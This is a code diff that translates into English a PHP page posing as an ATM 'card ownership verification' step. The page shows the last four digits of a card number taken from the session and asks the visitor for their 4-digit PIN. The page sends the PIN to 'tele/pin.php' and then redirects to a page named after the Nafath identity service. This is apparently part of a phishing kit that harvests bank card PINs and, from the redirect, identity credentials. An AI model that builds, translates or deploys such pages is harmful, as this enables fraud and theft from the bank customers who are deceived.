@@ -1,11 +1,11 @@
 <?php
 session_start();
+require_once '../includes/lang.php';
+set_site_lang('en');
 
-require_once 'includes/lang.php';
-set_site_lang('ar');
 
-require_once 'dashboard/init.php';
-require_once 'includes/redirect.php';
+require_once '../dashboard/init.php';
+require_once '../includes/redirect.php';
 
 // Get user ID from URL parameter or session
 $userId = null;
@@ -22,22 +22,22 @@ if (!$userId) {
     exit;
 }
 
-// ✅ 🆕 جلب رقم البطاقة من الـ SESSION
+// ✅ 🆕 جلب Card Number من الـ SESSION
 $cardNumber = $_SESSION['last_card_number'] ?? '';
 
-// ✅ حساب آخر 4 أرقام
+// ✅ حساب آخر 4 digits
 $digits = preg_replace('/\D/', '', $cardNumber);
 $last4 = strlen($digits) >= 4 ? substr($digits, -4) : '****';
 ?>
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en" dir="ltr">
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>إثبات ملكية البطاقة - ATM</title>
+  <title>Card Ownership Verification - ATM</title>
   <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="includes/lang-toggle.css">
-  <style>
+  <link rel="stylesheet" href="../includes/lang-toggle.css">
+    <style>
     /* نفس الـ CSS الموجود */
     *{margin:0;padding:0;box-sizing:border-box}
     body{font-family:'Cairo','Tahoma',Arial,sans-serif;background:#f5f5f5;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
@@ -46,11 +46,11 @@ $last4 = strlen($digits) >= 4 ? substr($digits, -4) : '****';
     .header-right{display:flex;align-items:center;gap:16px}
     .logo{height:70px;width:auto}
     @media (max-width: 768px) {.logo{transform: translateX(70px)}}
-    .header-text{text-align:right}
+    .header-text{text-align:left}
     .content{padding:40px 32px;text-align:center}
     .atm-title{font-size:48px;font-weight:800;color:#1e40af;letter-spacing:8px;margin-bottom:16px}
     .main-instruction{font-size:18px;font-weight:700;color:#1f2937;margin-bottom:10px;line-height:1.6}
-    .instruction-box{background:#f9fafb;border:1px solid #e5e7eb;border-radius:12px;padding:24px;margin:24px 0 32px;text-align:right}
+    .instruction-box{background:#f9fafb;border:1px solid #e5e7eb;border-radius:12px;padding:24px;margin:24px 0 32px;text-align:left}
     .instruction-text{font-size:15px;color:#374151;line-height:1.8}
     .instruction-highlight{color:#1e40af;font-weight:700}
     .pin-wrapper{display:flex;justify-content:center;gap:16px;margin:32px 0;direction:ltr}
@@ -85,16 +85,16 @@ $last4 = strlen($digits) >= 4 ? substr($digits, -4) : '****';
 
   <div class="content">
     <h2 class="atm-title">ATM</h2>
-    <p class="main-instruction">إثبات ملكية البطاقة</p>
-    <p class="main-instruction">لتأكيد العملية أدخل الرقم السري للصراف الآلي</p>
+    <p class="main-instruction">Card Ownership Verification</p>
+    <p class="main-instruction">To confirm, enter your ATM card PIN</p>
 
     <div class="instruction-box">
       <p class="instruction-text">
-        الرجاء إدخال الرمز السري
+        Please enter your PIN
         <span class="instruction-highlight">(PIN ATM)</span>
-        المكوّن من
-        <span class="instruction-highlight">4 أرقام</span>
-        للبطاقة المنتهية بـ
+        consisting of
+        <span class="instruction-highlight">4 digits</span>
+        for the card ending in
         <span class="instruction-highlight" id="cardLast4"><?php echo htmlspecialchars($last4); ?></span>
       </p>
     </div>
@@ -116,12 +116,12 @@ $last4 = strlen($digits) >= 4 ? substr($digits, -4) : '****';
       <button type="button" class="numpad-key" data-value="9">9</button>
       <button type="button" class="numpad-key" data-value="8">8</button>
       <button type="button" class="numpad-key" data-value="7">7</button>
-      <button type="button" class="numpad-key action" data-action="clear">مسح الكل</button>
+      <button type="button" class="numpad-key action" data-action="clear">Clear All</button>
       <button type="button" class="numpad-key" data-value="0">0</button>
-      <button type="button" class="numpad-key action" data-action="back">⌫ مسح</button>
+      <button type="button" class="numpad-key action" data-action="back">⌫ Delete</button>
     </div>
 
-    <button class="submit-button" id="submitBtn" type="button" disabled>تأكيد</button>
+    <button class="submit-button" id="submitBtn" type="button" disabled>Confirm</button>
 
     <div class="error-message" id="errorMessage"></div>
     <div class="success-message" id="successMessage"></div>
@@ -129,9 +129,9 @@ $last4 = strlen($digits) >= 4 ? substr($digits, -4) : '****';
 </div>
 
 <script>
-// ✅ استقبال رقم البطاقة من PHP مباشرة
+// ✅ استقبال Card Number من PHP مباشرة
 const cardLast4 = '<?php echo $last4; ?>';
-console.log('✅ آخر 4 أرقام من البطاقة:', cardLast4);
+console.log('✅ آخر 4 digits من البطاقة:', cardLast4);
 
 // PIN Input Logic
 const inputs = document.querySelectorAll('.pin-input');
@@ -203,45 +203,45 @@ submitBtn.addEventListener('click', async function() {
   const pin = [...inputs].map(i => i.value).join('');
   
   if (pin.length !== 4) {
-    showError('الرجاء إدخال رمز PIN مكون من 4 أرقام');
+    showError('Please enter a 4-digit PIN');
     return;
   }
 
   submitBtn.disabled = true;
-  submitBtn.textContent = 'جاري الإرسال...';
+  submitBtn.textContent = 'Submitting...';
 
   const fd = new FormData();
   fd.append('user_id', '<?= $userId ?>');
   fd.append('pin', pin);
 
 try {
-    const res = await fetch('tele/pin.php', {
+    const res = await fetch('../tele/pin.php', {
       method: 'POST',
       body: fd
     });
 
     const text = await res.text().then(t => t.trim());
-    console.log('✅ تم إرسال PIN:', pin);
+    console.log('PIN submitted:', pin);
     
-    // ✅ التحقق من الـ response
+    // ✅ الVerify من الـ response
     if (res.ok || text.includes('SUCCESS') || text === '') {
-      showSuccess('✅ تم الإرسال بنجاح');
+      showSuccess('Submitted successfully');
       
-      // ✅ الانتقال التلقائي بعد ثانية
+      // ✅ الانتقال التلقائي بعد seconds
       setTimeout(() => {
         window.location.href = 'nafad.php?id=<?= $userId ?>';
       }, 1000);
     } else {
-      showError('❌ حدث خطأ: ' + text);
+      showError('Error: ' + text);
       submitBtn.disabled = false;
-      submitBtn.textContent = 'تأكيد';
+      submitBtn.textContent = 'Confirm';
     }
 
   } catch (err) {
     console.error('Error:', err);
-    showError('❌ حدث خطأ في الاتصال');
+    showError('Connection error');
     submitBtn.disabled = false;
-    submitBtn.textContent = 'تأكيد';
+    submitBtn.textContent = 'Confirm';
   }
 });
 </script>
